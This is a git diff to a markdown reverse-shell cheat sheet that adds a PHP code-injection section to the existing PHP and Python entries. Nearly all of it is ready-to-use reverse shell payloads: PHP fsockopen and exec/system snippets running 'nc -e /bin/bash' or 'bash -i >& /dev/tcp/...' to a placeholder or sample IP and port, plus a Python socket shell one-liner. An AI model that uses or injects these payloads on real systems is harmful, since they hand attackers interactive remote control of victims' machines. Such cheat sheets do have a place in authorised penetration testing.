@@ -103,7 +103,7 @@ Older versions of nc don't have the nice `-e` option, so it has to be done sligh
 
 ## PHP
 
-### Simple Shell
+### Command Line Based
 
     php -r '$sock=fsockopen("[IP]",[Port]);exec("/bin/sh -i <&3 >&3 2>&3");'
     
@@ -115,6 +115,23 @@ Older versions of nc don't have the nice `-e` option, so it has to be done sligh
 #### Examples
 
     php -r '$sock=fsockopen("192.168.54.98",8888);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+### Code Injection Based
+
+The principle here can be used with any of the command line based reverse shells, in this example netcat is used, the php function can also be changed 
+
+    <?php exec("nc -e /bin/bash [IP] [PORT]"); ?>
+
+#### Params
+
+    [IP]: The IP address to connect back to with a shell
+    [Port]: The port to connect to
+
+#### Examples
+
+    <?php exec("nc -e /bin/bash 192.168.56.101 4444"); ?>
+
+    <?php system("bash -i >& /dev/tcp/192.168.56.101/4444 0>&1"); ?>
 
 ## Python
 
@@ -131,4 +148,4 @@ Older versions of nc don't have the nice `-e` option, so it has to be done sligh
 
     python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.101",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
-*Note: Some shells here were sourced or modified from http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet*
+*Note: Some shells here were sourced or modified from http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet *
